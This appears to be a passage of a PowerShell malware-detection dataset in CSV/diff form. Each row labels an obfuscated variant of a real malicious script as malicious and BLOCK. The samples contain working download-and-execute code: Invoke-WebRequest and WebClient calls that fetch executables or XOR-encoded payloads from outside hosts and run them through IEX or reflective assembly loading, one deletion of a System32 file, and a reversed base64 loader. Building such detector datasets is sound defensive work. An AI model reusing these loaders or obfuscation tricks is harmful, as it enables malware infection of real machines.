Zv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5iZrNXckszQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5iZrNXcksjIkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UiACdjVmai9UL3VmTg0DImt2cxRyOdVTMu4CMbJ2YvFGJg0DIhxGcksTKj1WcwRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbBSPgI2YvFGJ7IiIgwiIcxlIgU2YhxGclJXLgMWbxBHJg0DIj1WcwRyOlVHbhZlLdFzWzBXdvJ3RukiI68DX68DXp8jKugyPc9DX6ojIgwSbvBHbkgCajRXYNpjOdhXZnVmcbBSPgMWbxBHJ7kSbzRXckgyZulmc0NFZh9Gbud3bE5SK05WZpx2QiV2VuQXZOBCdjVmai9WL3VmboASPg02bwxGJ7BSKyVmbpFGdu92QgUGc5RFa0FGUtAyc45mbkACa0FGUtACa0FGUtQ3clRFKgYWa7ICXiAyKgEnbzlHJgsCIiwlIgsCItFXe4RCI9Ayc45mbksTKpIyaXRDNigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIx52c5RyOoRXYQ5SKu9Wa0F2YvxWL0V2ZoQCI9ASbxlHeksjI9ADM0pVe65GZN9CO4pkNiJ0MpN1bqN3MvRHUGxGSwoWMHBDUuJ3VmJHZ2tmIg0DInFnd4RyOpkiI1ljMjFXNT5UNnR0T6dmIgsCIiQkT3dmeMZnVHpFcaNDT5l1MMJCIrAiIwJEWZZHMyIma1knYsFzVhJTO5JCIrAiIMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DItNHdxRyOiQTNzYDMiBTOhRTN4MzYxIGZlFTMhZWMkRzNwUmZhFGNiASPgQWa1VHJ""[-1..-1568] -join '')))));",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_1ccc1b9201fd,seed_017509287b2d,1362__seed_017509287b2d__invoke_webrequest_call_operator_string.ps1,malicious,BLOCK,invoke_webrequest_call_operator_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,1,0,True,88,88,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,f42dd8831b93,&('Invoke-'+'WebRequest') -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_9a1c3e8ddcd5,seed_017509287b2d,1362__seed_017509287b2d__invoke_webrequest_alias.ps1,malicious,BLOCK,invoke_webrequest_alias,keyword_hiding,cross_runtime,2,Invoke-WebRequest,1,1,True,66,66,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,a94ed5490324,iwr -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_5d96d3915247,seed_ebc39e9baa2c,d1727799f2fa203f982f632e38e2add1a8d4591086994422871baa8ba541deb3__seed_ebc39e9baa2c__invoke_webrequest_call_operator_string.ps1,malicious,BLOCK,invoke_webrequest_call_operator_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,1,0,True,110,110,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,02644ff528f6,d6ab1a6037c3,&('Invoke-'+'WebRequest') http://185.170.144.156:9393/vmZqQGA.exe -OutFile C:\Users\MSSQLSERVER\Q1XGN03O.exe  ,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_1fc258651487,seed_ebc39e9baa2c,d1727799f2fa203f982f632e38e2add1a8d4591086994422871baa8ba541deb3__seed_ebc39e9baa2c__invoke_webrequest_alias.ps1,malicious,BLOCK,invoke_webrequest_alias,keyword_hiding,cross_runtime,2,Invoke-WebRequest,1,1,True,88,88,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,02644ff528f6,05ff82b6ec59,iwr http://185.170.144.156:9393/vmZqQGA.exe -OutFile C:\Users\MSSQLSERVER\Q1XGN03O.exe  ,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_d0ecc514c9e9,seed_78935433549c,a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96__seed_78935433549c__invoke_webrequest_call_operator_string.ps1,malicious,BLOCK,invoke_webrequest_call_operator_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,2,1,True,304,304,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,8fdb8525d5d6,2f2498ff9012,"New-Item -ItemType Directory -Path ""C:\Temp""
+&('Invoke-'+'WebRequest') -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Start-Process -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Remove-Item -Path ""C:\Windows\System32\diskc.sys""",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_cbe8eef2db05,seed_78935433549c,a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96__seed_78935433549c__invoke_webrequest_alias.ps1,malicious,BLOCK,invoke_webrequest_alias,keyword_hiding,cross_runtime,2,Invoke-WebRequest,2,2,True,282,282,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,8fdb8525d5d6,8ed73665be66,"New-Item -ItemType Directory -Path ""C:\Temp""
+iwr -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Start-Process -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Remove-Item -Path ""C:\Windows\System32\diskc.sys""",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_cc8500aac28f,seed_78935433549c,a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96__seed_78935433549c__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,3,Start-Process,2,1,True,304,304,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,8fdb8525d5d6,5c8ad9673977,"New-Item -ItemType Directory -Path ""C:\Temp""
+Invoke-WebRequest -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
+&('Start-'+'Process') -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Remove-Item -Path ""C:\Windows\System32\diskc.sys""",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_9e2b299cd506,seed_d1dab60aa6f5,35f003c6ee4b9261caac262983739bceabc65c859b01414d170942cfd92de495__seed_d1dab60aa6f5__invoke_webrequest_call_operator_string.ps1,malicious,BLOCK,invoke_webrequest_call_operator_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,3,1,True,563,563,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,8e5c819f6ddb,0144bd17356a,"sleep -Milliseconds 1235
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+&('Invoke-'+'WebRequest') -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/start.php') -UseBasicParsing
+
+$bytes = (New-Object System.Net.WebClient).DownloadData(""https://adv-pardorudy.ru/dwnld/chatgpt.jpg"")
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+$method = $assembly.EntryPoint
+if ($method) {
+    $args1 = @($null)
+    $method.Invoke($null, $args1)
+}
+
+&('Invoke-'+'WebRequest') -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/install.php') -UseBasicParsing",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_7bcf6b84552e,seed_d1dab60aa6f5,35f003c6ee4b9261caac262983739bceabc65c859b01414d170942cfd92de495__seed_d1dab60aa6f5__invoke_webrequest_alias.ps1,malicious,BLOCK,invoke_webrequest_alias,keyword_hiding,cross_runtime,2,Invoke-WebRequest,3,3,True,519,519,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,8e5c819f6ddb,2fdb4a12e365,"sleep -Milliseconds 1235
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+iwr -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/start.php') -UseBasicParsing
+
+$bytes = (New-Object System.Net.WebClient).DownloadData(""https://adv-pardorudy.ru/dwnld/chatgpt.jpg"")
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+$method = $assembly.EntryPoint
+if ($method) {
+    $args1 = @($null)
+    $method.Invoke($null, $args1)
+}
+
+iwr -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/install.php') -UseBasicParsing",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_c73bcc159eb2,seed_f99df091624c,3834__seed_f99df091624c__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,5,4,True,560,560,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f125ca377cd2,8f5c6a8d704d,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};&('I'+'EX') ($B-jOin'');",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_e25b934e13e2,seed_f99df091624c,3834__seed_f99df091624c__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,5,4,True,574,574,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f125ca377cd2,dc9df4358a1c,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};&([scriptblock]::Create(($B-jOin'')));",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_af4d6af82d7d,seed_f99df091624c,3834__seed_f99df091624c__invoke_webrequest_call_operator_string.ps1,malicious,BLOCK,invoke_webrequest_call_operator_string,keyword_hiding,cross_runtime,3,Invoke-WebRequest,5,4,True,560,560,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f125ca377cd2,deff73f427a3,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;&('Invoke-'+'WebRequest') -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_c3eac2d0d288,seed_f99df091624c,3834__seed_f99df091624c__invoke_webrequest_alias.ps1,malicious,BLOCK,invoke_webrequest_alias,keyword_hiding,cross_runtime,4,Invoke-WebRequest,5,5,True,538,538,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f125ca377cd2,03ae2929a648,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;iwr -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_b56a40c8aa7e,seed_f99df091624c,3834__seed_f99df091624c__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,5,DownloadString,5,4,True,582,582,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f125ca377cd2,ee88d2115694,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.PSObject.Methods['Download'+'String'].Invoke(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_140f85d5affd,seed_124883cece34,9724cca0b85958d7c2a57c7ad57984f7874c8a1a98f6f6eef4f8871e2ffdb100__seed_124883cece34__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,4,3,True,686,686,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,bba8f95397e1,1a2231505bb7,[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };&('Invoke-'+'Expression') ([System.Text.Encoding]::UTF8.GetString($decryptedBytes)),Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_6c9620795230,seed_124883cece34,9724cca0b85958d7c2a57c7ad57984f7874c8a1a98f6f6eef4f8871e2ffdb100__seed_124883cece34__invoke_expression_scriptblock_create.ps1,malicious,BLOCK,invoke_expression_scriptblock_create,execution_indirection,cross_runtime,2,Invoke-Expression,4,3,True,686,686,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,bba8f95397e1,e86e8ea3345f,[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };&([scriptblock]::Create(([System.Text.Encoding]::UTF8.GetString($decryptedBytes)))),Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_a107bd1c245e,seed_124883cece34,9724cca0b85958d7c2a57c7ad57984f7874c8a1a98f6f6eef4f8871e2ffdb100__seed_124883cece34__invoke_webrequest_call_operator_string.ps1,malicious,BLOCK,invoke_webrequest_call_operator_string,keyword_hiding,cross_runtime,3,Invoke-WebRequest,4,3,True,686,686,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,bba8f95397e1,49f9f9da7dd7,[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (&('Invoke-'+'WebRequest') -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes)),Invoke-WebRequest,strict,parse_valid_and_invariants_ok
+variant_a0d7493926bb,seed_124883cece34,9724cca0b85958d7c2a57c7ad57984f7874c8a1a98f6f6eef4f8871e2ffdb100__seed_124883cece34__invoke_webrequest_alias.ps1,malicious,BLOCK,invoke_webrequest_alias,keyword_hiding,cross_runtime,4,Invoke-WebRequest,4,4,True,664,664,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,bba8f95397e1,d75ee3c0bc5a,[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (iwr -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes)),Invoke-WebRequest,strict,parse_valid_and_invariants_ok
